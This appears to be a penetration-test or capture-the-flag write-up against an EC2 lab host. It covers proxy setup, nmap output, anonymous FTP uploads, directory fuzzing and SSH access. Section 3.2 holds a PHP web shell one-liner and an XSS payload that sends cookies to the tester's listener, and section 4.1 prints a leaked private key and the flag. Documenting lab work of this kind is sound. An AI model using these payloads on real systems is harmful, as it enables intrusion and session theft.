# Penetration Test Documentation: Initial Enumeration

**Date**: October 25, 2025  
**Target**: 13.40.110.252 (ec2-13-40-110-252.eu-west-2.compute.amazonaws.com)

**Flags**:
 - 1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL

## 1. Setup and Approach

### 1.1 Hybrid Attack Setup
To meet the penetration test requirement of using a specific source IP, I set up a hybrid attack infrastructure leveraging a Debian-based AWS EC2 instance (t3.small) and a local attack box running **Exegol**. I went with this approach to ensure I can maintain persistent access to the target, as my home IP is dynamic.

- **AWS EC2 Instance (t3.small, Debian)**:
  - **Purpose**: Hosts lightweight tools (`nmap`, `curl`, `ftp`) and serves as a SOCKS5 proxy for heavier workloads.
  - **Configuration**: Debian 12, t3.small (2 vCPUs, 2 GB RAM), assigned an elastic IP to provide a static source IP, avoiding issues with my home network’s dynamic IP.
  - **Rationale**: The elastic IP ensures all traffic appears to originate from a consistent, whitelisted IP address. Running lightweight tools directly on the EC2 minimizes latency and resource strain on the t3.small instance.
  - **SOCKS5 Proxy**: Established via SSH dynamic port forwarding for proxying local heavy tools.
    ```bash
    ssh -i exegol.pem -D 1080 -N admin@ec2-18-169-47-172.eu-west-2.compute.amazonaws.com
    ```
  - **Proxychains Config**: Configured on my local machine to route traffic through the EC2 proxy.
    ```conf
    # /etc/proxychains.conf
    socks5 127.0.0.1 1080
    ```
  - **Verification**: Confirmed proxy routing:
    ```bash
    proxychains curl ifconfig.me
    ```
    - Output: `18.169.47.172`, confirming traffic routes through EC2.

- **Local Attack Box (Exegol)**:
  - **Purpose**: Runs resource-intensive tools (`ffuf`, `Burp Suite`, `Metasploit`) via **proxychains** to leverage local compute power.
  - **Configuration**: Exegol, a Docker-based penetration testing environment, provides a pre-configured toolset ideal for my approach. 
  - **Rationale**: Exegol’s containerised setup ensures a clean, reproducible environment for heavy workloads, while proxying through the EC2 maintains the required source IP.

- **Security Groups**:
  - EC2: Allows inbound/outbound traffic to `13.40.110.252` (all ports/protocols) and inbound `ssh` from my local Exegol host.
  - Local: No specific configuration needed, as **proxychains** routes traffic via EC2.

## 2. Initial Enumeration

### 2.1 Nmap Scan
Ran an initial scan from the EC2 instance to identify services and potential vectors for flag capture.

- **Command**:
  ```bash
  sudo nmap -sC -sV -O -oA initial_scan 13.40.110.252
  ```
- **Results**:
  ```
	Nmap scan report for ec2-13-40-110-252.eu-west-2.compute.amazonaws.com (13.40.110.252)
	Host is up (0.00075s latency).
	Not shown: 996 closed tcp ports (reset)
	PORT   STATE    SERVICE VERSION
	21/tcp open     ftp     vsftpd 2.0.8 or later
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_Can't get directory listing: PASV IP 172.31.14.224 is not the same as 13.40.110.252
	22/tcp open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   256 ad:8b:16:ae:4d:2b:f1:1e:cd:6e:af:99:b3:b1:79:12 (ECDSA)
	|_  256 9e:6b:4c:ba:dc:c3:73:d7:b0:af:04:4d:ea:83:1d:23 (ED25519)
	25/tcp filtered smtp
	80/tcp open     http    Apache httpd 2.4.58
	|_http-server-header: Apache/2.4.58 (Ubuntu)
	|_http-title: Index of /
	| http-ls: Volume /
	| SIZE  TIME              FILENAME
	| -     2024-07-02 14:08  portfolio_one-page-template/
	| 1.1K  2024-07-02 10:54  portfolio_one-page-template/LICENSE.md
	| 6.0K  2024-07-02 10:54  portfolio_one-page-template/README.md
	| -     2024-07-02 10:54  portfolio_one-page-template/build/
	| -     2024-07-02 10:54  portfolio_one-page-template/dev/
	| -     2024-07-02 10:54  portfolio_one-page-template/gulp_tasks/
	| 57    2024-07-02 10:54  portfolio_one-page-template/gulpfile.js
	| 1.0K  2024-07-02 10:54  portfolio_one-page-template/package.json
	| -     2024-07-02 12:21  portfolio_one-page-template/screenshots/
  ```

- **Analysis**:
  - **21/FTP**: vsftpd 2.0.8+ with anonymous login enabled, makes this an interesting enumeration target.
  - **22/SSH**: OpenSSH 9.6p1 (Ubuntu). 
  - **25/SMTP**: Filtered, possibly due to firewall or **nmap** SYN scan settings.
  - **80/HTTP**: Apache 2.4.58, directory listing enabled. 

### 2.2 Initial Enumeration Plan
- **FTP (Port 21)**: Exploit anonymous login to see extent of access/download files.
- **HTTP (Port 80)**: Enumerate `/portfolio_one-page-template/` for potential vulnerabilities or secrets 
- **SMTP (Port 25)**: Retest to confirm filtering


## 3. Enumeration Commands and Findings

### 3.1 FTP Enumeration (EC2)
- **Anonymous login to FTP**:
  ```
  ftp -A 13.40.110.252
  
  Connected to 13.40.110.252.
  220-I don't know who you are. I don't know what youwant. If you are looking for ransom, I can tell you I
  don't have money.
  But what I do have are a very particular set of skills; skills I have acquired over a very long career.  Skills that make me a
  nightmare for people like you. If you let my server go now, that'll be the end of it. I will not look for you, I will not pursue
  you. But if you don't, I will look for you, I will find you, and I will delete you.
  220
  Name (13.40.110.252:admin): anonymous
  230 Login successful.
  ```
- **List files/directories**:
    ```bash
  ls -la
  500 Illegal PORT command.
  ftp: Can't bind for data connection: Address already in use
  ```
- **Passive Mode**:
  ```bash
  ftp> ls -la
  227 Entering Passive Mode (172,31,14,224,219,237).
  Passive mode address mismatch.
  ```
- **FTP with curl**:
  ```
  curl -l ftp://anonymous:@13.40.110.252/

  pic.jpg
  portfolio_one-page-template_1440px.jpg
  portfolio_one-page-template_480px-fullpage.jpg
  portfolio_one-page-template_640px-fullpage.jpg
  portfolio_one-page-template_800px-fullpage.jpg
  uploads
  ```
 - **Exploring Uploads**:
   ```
   curl -l ftp://anonymous:@13.40.110.252/uploads/
   
   Test.txt
   
   curl -O ftp://anonymous:@13.40.110.252/uploads/Test.txt

   curl: (78) The file does not exist
   ```
- **Upload test**
   ```
  echo test > test1.txt
   curl -T test1.txt ftp://anonymous:@13.40.110.252/uploads/test1.txt

  curl -l ftp://anonymous:@13.40.110.252/uploads/
  Test.txt
  test1.txt
	 ```
- **Notes**: The PASV IP mismatch shown in the `nmap` scan is likely why the `ftp` client is struggling, `curl` was used to cleanly handle the mismatch, as it can skip the listed IP: `172.31.14.224` for data connection,  and instead re-use `13.40.110.252`. Initial enumeration points to an image/upload area of the website, where we can successfully upload files, an obvious vector for web/reverse shells later. The only confirm actions are upload, list and delete. LFI via ../../ also does not work.

### 3.2 HTTP Enumeration
- **Visiting** http://13.40.110.252**:
  This takes us to the index root of the site, with `portfolio_one-page-template/` and its subdirectories:
  ```
  [ PARENTDIR]	Parent Directory	 	- 	 
  [TXT]	LICENSE.md	2024-07-02 10:54 	1.1K	 
  [TXT]	README.md	2024-07-02 10:54 	6.0K	 
  [DIR]	build/	2024-07-02 10:54 	- 	 
  [DIR]	dev/	2024-07-02 10:54 	- 	 
  [DIR]	gulp_tasks/	2024-07-02 10:54 	- 	 
  [TXT]	gulpfile.js	2024-07-02 10:54 	57 	 
  [ ]	package.json	2024-07-02 10:54 	1.0K	 
  [DIR]	screenshots/
  ```

- **Web Shell**: 
   Browsing to `portfolio_one-page-template/screenshots/uploads/`, we can find our test1.txt file. Dropping a web shell here works, though it does not execute our php.
   ```
   echo "<?php system($_GET['cmd']); ?>" > shell.php
   curl -v -T shell.php ftp://anonymous:@13.40.110.252/uploads/

   curl "http://13.40.110.252/portfolio_one-page-template/screenshots/uploads/shell.php?cmd=id"
   <?php system($_GET['cmd']); ?>
  ```
    I also tried uploading my own `.htaaccess` with `AddType application/x-httpd-php .php .html .htm` with no success. 

- **XSS**: 
Uploading a `<script>alert(document.domain)</script>` confirms it can render js, so I dropped a basic payload assuming there was a simulated admin/bot and setup my listener. No success there. 
  ```
  fetch('http://18.169.47.172:8080/beacon?' + new URLSearchParams({
  url: location.href,
  cookie: document.cookie
  ```

- **ffuf**:
  ```
  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/build/FUZZ
  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/FUZZ
  ```
  Immediate findings are .git and .ssh, .ssh containing a public and private key, id_ed25519, id_ed25519.pub, with the .pub containing a username, BillyTheKid.

- **Notes**: I found nothing remarkable when looking through the underlying logic in .js or any secrets in .cfg files. /build/ gives us a direct render of the site, `gulp_tasks/config/paths.js`does not reference `/screenshots/uploads` at all.
The .pub file 

### 3.3 SMTP
- **Notes**: Trying various different nmap scans `-sT -sX` etc and various timeout intervals yield no results, it's a hard filtered port, likely accessible locally from a web/reverse shell.

## 4. Privilege Escalation and 

### 4.1 Initial Access

- **Using the Private Key**:
   ```
   curl http://13.40.110.252/portfolio_one-page-template/.ssh/id_ed25519
   
  -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
   QyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYwAAAJij6Mx/o+jM
   fwAAAAtzc2gtZWQyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYw
   AAAECAO7jrO8DIkMbeCcll0I/iOlt4I+5TMpkLAOw2VF5jkh7WwoQwIKKDtDRlblB279yD
   /CykkswsE72m4QbWlstjAAAAFHJvb3RAaXAtMTcyLTMxLTYtMTIwAQ==
  -----END OPENSSH PRIVATE KEY-----
   ```
- **SSH**:
  ```
  ssh -i key BillyTheKid@13.40.110.252
  BillyTheKid@ip-172-31-14-224:~$
  BillyTheKid@ip-172-31-14-224:~$ ls
  Flag_1  Message_from_your_friendly_neighbourhood_root
  BillyTheKid@ip-172-31-14-224:~$ cat Flag_1
  
  1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
  ```






